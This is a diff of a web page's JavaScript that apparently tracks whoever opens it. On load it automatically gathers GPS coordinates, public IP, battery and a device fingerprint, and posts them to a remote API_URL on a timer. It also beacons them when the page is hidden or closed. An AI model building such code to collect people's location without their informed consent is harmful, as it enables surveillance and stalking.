-        ).textContent =
-          locationData.altitude !== ""
-          ?
-          Number(
-            locationData.altitude
-          ).toFixed(2)
-          + " m"
-          :
-          "---";
-
-
-        document.getElementById(
-          "speed"
-        ).textContent =
-          locationData.speed !== ""
-          ?
-          Number(
-            locationData.speed
-          ).toFixed(2)
-          + " m/s"
-          :
-          "---";
-
-
-        document.getElementById(
-          "heading"
-        ).textContent =
-          locationData.heading !== ""
-          ?
-          Number(
-            locationData.heading
-          ).toFixed(1)
-          + "°"
-          :
-          "---";
-
-
-        document.getElementById(
-          "location"
-        ).textContent =
-          Number(
-            locationData.latitude
-          ).toFixed(5)
-          +
-          ", "
-          +
-          Number(
-            locationData.longitude
-          ).toFixed(5);
+        updateGPSUI(
+          position
+        );
 
 
         addLog(
-          "📍 GPS updated"
+          "GPS updated"
         );
 
       },
-
 
       function(error){
 
-        let message =
-          "GPS unavailable";
-
-
-        if(
-          error.code === 1
-        ){
-
-          message =
-            "Location permission denied";
-
-        }
-        else if(
-          error.code === 2
-        ){
-
-          message =
-            "Location unavailable";
-
-        }
-        else if(
-          error.code === 3
-        ){
-
-          message =
-            "GPS timeout";
-
-        }
-
-
-        document.getElementById(
-          "location"
-        ).textContent =
-          message;
-
-
         addLog(
-          "⚠️ " + message
+          "GPS error: " +
+          error.message
         );
 
       },
-
 
       {
 
@@ -1518,20 +1478,163 @@ function requestLocation(){
 
         maximumAge:5000,
 
-        timeout:20000
+        timeout:15000
 
       }
 
     );
 
+
 }
 
 
-/****************************************************
- * NETWORK
- ****************************************************/
+/* =========================
+   UPDATE GPS BUTTON
+========================= */
 
-function getNetworkInfo(){
+function updateGPS(){
+
+  if(!navigator.geolocation){
+
+    alert(
+      "GPS is not supported."
+    );
+
+    return;
+
+  }
+
+
+  navigator.geolocation.getCurrentPosition(
+
+    function(position){
+
+      currentPosition =
+        position;
+
+
+      updateGPSUI(
+        position
+      );
+
+
+      addLog(
+        "GPS manually updated"
+      );
+
+    },
+
+    function(error){
+
+      addLog(
+        "GPS error: " +
+        error.message
+      );
+
+      alert(
+        "GPS পাওয়া যাচ্ছে না। Location permission allow করুন।"
+      );
+
+    },
+
+    {
+
+      enableHighAccuracy:true,
+
+      timeout:15000,
+
+      maximumAge:0
+
+    }
+
+  );
+
+}
+
+
+/* =========================
+   GPS UI
+========================= */
+
+function updateGPSUI(position){
+
+  const coords =
+    position.coords;
+
+
+  const lat =
+    coords.latitude;
+
+
+  const lon =
+    coords.longitude;
+
+
+  document.getElementById(
+    "latitude"
+  ).textContent =
+    lat;
+
+
+  document.getElementById(
+    "longitude"
+  ).textContent =
+    lon;
+
+
+  document.getElementById(
+    "location"
+  ).textContent =
+    lat.toFixed(6) +
+    ", " +
+    lon.toFixed(6);
+
+
+  document.getElementById(
+    "gpsAccuracy"
+  ).textContent =
+    coords.accuracy
+      ? coords.accuracy.toFixed(1) +
+        " m"
+      : "-";
+
+
+  document.getElementById(
+    "altitude"
+  ).textContent =
+    coords.altitude !== null
+      ? coords.altitude.toFixed(1) +
+        " m"
+      : "-";
+
+
+  document.getElementById(
+    "speed"
+  ).textContent =
+    coords.speed !== null &&
+    coords.speed >= 0
+      ? coords.speed.toFixed(2) +
+        " m/s"
+      : "-";
+
+
+  document.getElementById(
+    "heading"
+  ).textContent =
+    coords.heading !== null &&
+    coords.heading >= 0
+      ? coords.heading.toFixed(1) +
+        "°"
+      : "-";
+
+}
+
+
+/* =========================
+   NETWORK
+========================= */
+
+function getConnection(){
 
   const connection =
     navigator.connection ||
@@ -1539,85 +1642,65 @@ function getNetworkInfo(){
     navigator.webkitConnection;
 
 
-  let type = "";
+  if(!connection){
 
-  let downlink = "";
+    return {
 
+      type:"Not Available",
 
-  if(connection){
+      downlink:"Not Available"
 
-    type =
-      connection.effectiveType ||
-      connection.type ||
-      "";
-
-
-    if(
-      connection.downlink !== undefined
-    ){
-
-      downlink =
-        connection.downlink
-        + " Mbps";
-
-    }
+    };
 
   }
 
 
-  document.getElementById(
-    "connectionType"
-  ).textContent =
-    type || "Unavailable";
-
-
-  document.getElementById(
-    "downlink"
-  ).textContent =
-    downlink || "Unavailable";
-
-
   return {
 
-    type:type,
+    type:
+      connection.effectiveType ||
+      connection.type ||
+      "Unknown",
 
-    downlink:downlink
+    downlink:
+      connection.downlink !== undefined
+        ? connection.downlink + " Mbps"
+        : "Unknown"
 
   };
 
 }
 
 
-/****************************************************
- * ONLINE
- ****************************************************/
+/* =========================
+   UPDATE ONLINE
+========================= */
 
 function updateOnlineStatus(){
 
-  const element =
-    document.getElementById(
-      "onlineStatus"
-    );
+  const online =
+    navigator.onLine;
 
 
-  if(navigator.onLine){
+  document.getElementById(
+    "online"
+  ).textContent =
+    online
+      ? "Online"
+      : "Offline";
 
-    element.textContent =
-      "Online";
 
-    element.className =
-      "card-value online";
+  document.getElementById(
+    "onlineStatus"
+  ).innerHTML =
+    online
 
-  }
-  else{
+      ? `<span class="dot"></span> Online`
 
-    element.textContent =
-      "Offline";
-
-    element.className =
-      "card-value offline";
-
-  }
+      : `<span
+           class="dot"
+           style="background:#ef4444"
+         ></span> Offline`;
 
 }
 
@@ -1634,17 +1717,17 @@ window.addEventListener(
 );
 
 
-/****************************************************
- * UPDATE DEVICE INFO
- ****************************************************/
+/* =========================
+   DEVICE INFO UI
+========================= */
 
-function updateDeviceInfo(){
+function loadDeviceInfo(){
 
   const deviceId =
     getDeviceId();
 
 
-  const mobileModel =
+  const model =
     getMobileModel();
 
 
@@ -1664,45 +1747,6 @@ function updateDeviceInfo(){
     getOSVersion();
 
 
-  const screen =
-    window.screen.width
-    +
-    " x "
-    +
-    window.screen.height;
-
-
-  const language =
-    navigator.language || "";
-
-
-  const timeZone =
-    Intl.DateTimeFormat()
-    .resolvedOptions()
-    .timeZone || "";
-
-
-  const pixelRatio =
-    window.devicePixelRatio || 1;
-
-
-  const ram =
-    navigator.deviceMemory
-    ?
-    navigator.deviceMemory
-    + " GB"
-    :
-    "";
-
-
-  const cpuCores =
-    navigator.hardwareConcurrency
-    ?
-    navigator.hardwareConcurrency
-    :
-    "";
-
-
   document.getElementById(
     "deviceId"
   ).textContent =
@@ -1712,7 +1756,7 @@ function updateDeviceInfo(){
   document.getElementById(
     "mobileModel"
   ).textContent =
-    mobileModel;
+    model;
 
 
   document.getElementById(
@@ -1742,233 +1786,271 @@ function updateDeviceInfo(){
   document.getElementById(
     "screen"
   ).textContent =
-    screen;
+    screen.width +
+    " × " +
+    screen.height;
 
 
   document.getElementById(
     "language"
   ).textContent =
-    language;
+    navigator.language ||
+    "Unknown";
 
 
   document.getElementById(
-    "timezone"
+    "timeZone"
   ).textContent =
-    timeZone;
+    Intl.DateTimeFormat()
+      .resolvedOptions()
+      .timeZone;
 
 
   document.getElementById(
     "pixelRatio"
   ).textContent =
-    pixelRatio;
+    window.devicePixelRatio ||
+    1;
 
 
   document.getElementById(
     "ram"
   ).textContent =
-    ram || "Unavailable";
+    navigator.deviceMemory
+      ? navigator.deviceMemory +
+        " GB"
+      : "Not Available";
 
 
   document.getElementById(
     "cpuCores"
   ).textContent =
-    cpuCores || "Unavailable";
+    navigator.hardwareConcurrency ||
+    "Not Available";
+
+
+  updateOnlineStatus();
+
+
+  const connection =
+    getConnection();
+
+
+  document.getElementById(
+    "connectionType"
+  ).textContent =
+    connection.type;
+
+
+  document.getElementById(
+    "downlink"
+  ).textContent =
+    connection.downlink;
+
+}
+
+
+/* =========================
+   PAYLOAD
+========================= */
+
+function buildPayload(){
+
+  const now =
+    new Date();
+
+
+  let latitude = "";
+
+  let longitude = "";
+
+  let accuracy = "";
+
+  let altitude = "";
+
+  let speed = "";
+
+  let heading = "";
+
+
+  if(currentPosition){
+
+    const c =
+      currentPosition.coords;
+
+
+    latitude =
+      c.latitude;
+
+
+    longitude =
+      c.longitude;
+
+
+    accuracy =
+      c.accuracy;
+
+
+    altitude =
+      c.altitude ?? "";
+
+
+    speed =
+      c.speed ?? "";
+
+
+    heading =
+      c.heading ?? "";
+
+  }
+
+
+  const connection =
+    getConnection();
 
 
   return {
 
-    deviceId,
+    date:
+      now.toLocaleDateString(
+        "en-GB"
+      ),
 
-    mobileModel,
 
-    deviceType,
+    time:
+      now.toLocaleTimeString(),
 
-    browser,
 
-    os,
+    ip:
+      publicIP,
 
-    osVersion,
 
-    screen,
+    location:
+      latitude !== "" &&
+      longitude !== ""
 
-    language,
+        ? latitude +
+          ", " +
+          longitude
 
-    timeZone,
+        : "Not Available",
 
-    pixelRatio,
 
-    ram,
+    latitude:
+      latitude,
 
-    cpuCores
+
+    longitude:
+      longitude,
+
+
+    battery:
+      getBatteryValue(),
+
+
+    deviceId:
+      getDeviceId(),
+
+
+    mobileModel:
+      getMobileModel(),
+
+
+    deviceType:
+      getDeviceType(),
+
+
+    browser:
+      getBrowser(),
+
+
+    os:
+      getOS(),
+
+
+    osVersion:
+      getOSVersion(),
+
+
+    screen:
+      screen.width +
+      " × " +
+      screen.height,
+
+
+    language:
+      navigator.language ||
+      "",
+
+
+    timeZone:
+      Intl.DateTimeFormat()
+        .resolvedOptions()
+        .timeZone,
+
+
+    pixelRatio:
+      window.devicePixelRatio ||
+      1,
+
+
+    onlineStatus:
+      navigator.onLine
+        ? "Online"
+        : "Offline",
+
+
+    connectionType:
+      connection.type,
+
+
+    downlink:
+      connection.downlink,
+
+
+    ram:
+      navigator.deviceMemory
+        ? navigator.deviceMemory +
+          " GB"
+        : "Not Available",
+
+
+    cpuCores:
+      navigator.hardwareConcurrency ||
+      "Not Available",
+
+
+    gpsAccuracy:
+      accuracy,
+
+
+    altitude:
+      altitude,
+
+
+    speed:
+      speed,
+
+
+    heading:
+      heading
 
   };
 
 }
 
 
-/****************************************************
- * SEND DATA
- ****************************************************/
+/* =========================
+   NORMAL SEND
+========================= */
 
 async function sendData(){
 
+  const payload =
+    buildPayload();
+
+
   try{
-
-    const date =
-      new Date()
-      .toLocaleDateString(
-        "en-GB"
-      );
-
-
-    const time =
-      new Date()
-      .toLocaleTimeString(
-        "en-GB"
-      );
-
-
-    document.getElementById(
-      "date"
-    ).textContent =
-      date;
-
-
-    document.getElementById(
-      "time"
-    ).textContent =
-      time;
-
-
-    const device =
-      updateDeviceInfo();
-
-
-    const battery =
-      await getBattery();
-
-
-    const ip =
-      await getIP();
-
-
-    const network =
-      getNetworkInfo();
-
-
-    updateOnlineStatus();
-
-
-    let locationText = "";
-
-
-    if(
-      locationData.latitude !== ""
-      &&
-      locationData.longitude !== ""
-    ){
-
-      locationText =
-        Number(
-          locationData.latitude
-        ).toFixed(6)
-        +
-        ", "
-        +
-        Number(
-          locationData.longitude
-        ).toFixed(6);
-
-    }
-
-
-    const payload = {
-
-      date:date,
-
-      time:time,
-
-      ip:ip,
-
-      location:locationText,
-
-      latitude:
-        locationData.latitude,
-
-      longitude:
-        locationData.longitude,
-
-      battery:battery,
-
-      deviceId:
-        device.deviceId,
-
-      mobileModel:
-        device.mobileModel,
-
-      deviceType:
-        device.deviceType,
-
-      browser:
-        device.browser,
-
-      os:
-        device.os,
-
-      osVersion:
-        device.osVersion,
-
-      screen:
-        device.screen,
-
-      language:
-        device.language,
-
-      timeZone:
-        device.timeZone,
-
-      pixelRatio:
-        device.pixelRatio,
-
-      onlineStatus:
-        navigator.onLine
-        ?
-        "Online"
-        :
-        "Offline",
-
-      connectionType:
-        network.type,
-
-      downlink:
-        network.downlink,
-
-      ram:
-        device.ram,
-
-      cpuCores:
-        device.cpuCores,
-
-      gpsAccuracy:
-        locationData.accuracy,
-
-      altitude:
-        locationData.altitude,
-
-      speed:
-        locationData.speed,
-
-      heading:
-        locationData.heading
-
-    };
-
-
-    document.getElementById(
-      "status"
-    ).textContent =
-      "Sending data...";
-
 
     await fetch(
 
@@ -1983,7 +2065,7 @@ async function sendData(){
         headers:{
 
           "Content-Type":
-          "text/plain;charset=utf-8"
+            "text/plain;charset=utf-8"
 
         },
 
@@ -1997,31 +2079,28 @@ async function sendData(){
     );
 
 
+    lastSendTimestamp =
+      Date.now();
+
+
     document.getElementById(
-      "status"
+      "lastSend"
     ).textContent =
-      "Data request sent";
+      new Date()
+        .toLocaleTimeString();
 
 
     addLog(
-      "📤 New data sent — "
-      + time
+      "Data sent"
     );
-
 
   }
 
   catch(error){
 
-    document.getElementById(
-      "status"
-    ).textContent =
-      "Send failed";
-
-
     addLog(
-      "❌ "
-      + error.message
+      "Send failed: " +
+      error.message
     );
 
   }
@@ -2029,9 +2108,9 @@ async function sendData(){
 }
 
 
-/****************************************************
- * SEND NOW
- ****************************************************/
+/* =========================
+   SEND NOW
+========================= */
 
 function sendNow(){
 
@@ -2040,22 +2119,26 @@ function sendNow(){
 }
 
 
-/****************************************************
- * START AUTO
- ****************************************************/
+/* =========================
+   AUTO START
+========================= */
 
 function startAuto(){
 
-  stopAuto(false);
+  stopAuto();
 
 
   const interval =
     Number(
       document.getElementById(
-        "interval"
+        "intervalSelect"
       ).value
     );
 
+
+  /*
+    Immediately send once
+  */
 
   sendData();
 
@@ -2074,18 +2157,24 @@ function startAuto(){
     );
 
 
+  document.getElementById(
+    "autoStatus"
+  ).textContent =
+    "ON";
+
+
   addLog(
-    "🔄 Auto Send started"
+    "Auto send started"
   );
 
 }
 
 
-/****************************************************
- * STOP AUTO
- ****************************************************/
+/* =========================
+   AUTO STOP
+========================= */
 
-function stopAuto(showLog = true){
+function stopAuto(){
 
   if(autoTimer !== null){
 
@@ -2095,115 +2184,287 @@ function stopAuto(showLog = true){
 
     autoTimer = null;
 
-
-    if(showLog){
-
-      addLog(
-        "⛔ Auto Send stopped"
-      );
-
-    }
-
   }
+
+
+  document.getElementById(
+    "autoStatus"
+  ).textContent =
+    "OFF";
+
 
 }
 
 
-/****************************************************
- * INTERVAL CHANGE
- ****************************************************/
+/* =========================
+   INTERVAL CHANGE
+========================= */
 
 document
-  .getElementById("interval")
+  .getElementById(
+    "intervalSelect"
+  )
   .addEventListener(
+
     "change",
+
     function(){
 
-      startAuto();
+      if(autoTimer !== null){
+
+        startAuto();
+
+      }
 
     }
+
   );
 
 
-/****************************************************
- * LOG
- ****************************************************/
+/* =========================
+   CLOSE / PAGE HIDE SEND
+========================= */
 
-function addLog(message){
+function sendFinalData(){
 
-  const box =
-    document.getElementById(
-      "activity"
+  /*
+    Prevent multiple executions
+  */
+
+  if(closeSendDone){
+
+    return;
+
+  }
+
+
+  closeSendDone = true;
+
+
+  const payload =
+    buildPayload();
+
+
+  const data =
+    JSON.stringify(
+      payload
     );
 
 
-  const item =
-    document.createElement(
-      "div"
+  /*
+    sendBeacon is designed
+    for page closing/navigation.
+  */
+
+  try{
+
+    const blob =
+      new Blob(
+
+        [data],
+
+        {
+          type:
+            "text/plain;charset=UTF-8"
+        }
+
+      );
+
+
+    const sent =
+      navigator.sendBeacon(
+        API_URL,
+        blob
+      );
+
+
+    if(sent){
+
+      addLog(
+        "Final data queued"
+      );
+
+      return;
+
+    }
+
+  }
+
+  catch(error){
+
+    /*
+      Ignore and try fetch
+    */
+
+  }
+
+
+  /*
+    Fallback
+  */
+
+  try{
+
+    fetch(
+
+      API_URL,
+
+      {
+
+        method:"POST",
+
+        mode:"no-cors",
+
+        keepalive:true,
+
+        headers:{
+
+          "Content-Type":
+            "text/plain;charset=utf-8"
+
+        },
+
+        body:data
+
+      }
+
     );
 
+  }
 
-  item.className =
-    "log-item";
+  catch(error){
 
-
-  item.textContent =
-    new Date()
-    .toLocaleTimeString()
-    +
-    " — "
-    +
-    message;
-
-
-  box.prepend(item);
-
-
-  while(
-    box.children.length > 40
-  ){
-
-    box.removeChild(
-      box.lastChild
-    );
+    /*
+      Browser may already be closing.
+    */
 
   }
 
 }
 
 
-/****************************************************
- * INITIALIZE
- ****************************************************/
+/*
+  pagehide is better for
+  mobile browser lifecycle.
+*/
 
-async function initialize(){
+window.addEventListener(
+  "pagehide",
+  sendFinalData
+);
 
-  updateDeviceInfo();
 
-  updateOnlineStatus();
+/*
+  visibilitychange:
+  only send when page becomes hidden.
 
-  getNetworkInfo();
+  This gives another chance on
+  mobile browsers.
+*/
 
-  requestLocation();
+document.addEventListener(
+
+  "visibilitychange",
+
+  function(){
+
+    if(
+      document.visibilityState ===
+      "hidden"
+    ){
+
+      /*
+        Do not immediately mark
+        permanently closed here.
+      */
+
+      try{
+
+        const payload =
+          buildPayload();
+
+
+        const blob =
+          new Blob(
+
+            [
+              JSON.stringify(
+                payload
+              )
+            ],
+
+            {
+              type:
+                "text/plain;charset=UTF-8"
+            }
+
+          );
+
+
+        navigator.sendBeacon(
+          API_URL,
+          blob
+        );
+
+
+        addLog(
+          "Background data queued"
+        );
+
+      }
+
+      catch(error){}
+
+    }
+
+  }
+
+);
+
+
+/* =========================
+   INITIALIZE
+========================= */
+
+async function init(){
+
+  addLog(
+    "System starting..."
+  );
+
+
+  loadDeviceInfo();
+
+
+  await loadBattery();
+
 
   getIP();
 
-  getBattery();
+
+  startGPS();
+
+
+  /*
+    Start auto automatically
+  */
 
   startAuto();
 
+
   addLog(
-    "✅ Dashboard started"
+    "System ready"
   );
 
 }
 
 
-/****************************************************
- * START
- ****************************************************/
+/* =========================
+   START
+========================= */
 
-initialize();
+init();
+
 
 </script>
 
